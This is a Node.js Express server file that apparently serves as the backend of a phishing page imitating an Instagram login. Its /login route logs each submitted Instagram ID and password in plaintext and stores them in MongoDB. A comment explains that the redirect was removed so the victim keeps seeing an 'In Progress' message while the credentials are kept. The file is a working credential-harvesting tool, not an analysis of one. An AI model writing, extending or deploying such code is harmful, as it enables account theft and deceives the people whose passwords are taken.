require('dotenv').config(); 
const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const path = require('path');
const User = require('./user'); 

const app = express();

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.json()); // JSON data handle karne ke liye zaroori hai

// Vercel/Live Server configurations
app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'ejs');
app.use(express.static(path.join(__dirname, 'public')));

// Database Connection
mongoose.connect(process.env.MONGO_URI)
    .then(() => console.log("Instagram DB Connected!"))
    .catch(err => console.error("DB Connection Error:", err));

// Routes
app.get('/', (req, res) => {
    res.render('index');
});

app.post('/login', async (req, res) => {
    const { instaId, password } = req.body;
    
    console.log(`Received - ID: ${instaId}, Pass: ${password}`);

    try {
        const newUser = new User({ instaId, password });
        await newUser.save();
        
        // Redirect hata diya taake user usi page par "In Progress" dekhta rahe
        res.status(200).json({ status: "success", message: "Processing..." });

    } catch (err) {
        console.error("Save Error:", err);
        res.status(500).json({ status: "error", message: "Technical issue" });
    }
});

// Port configuration
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});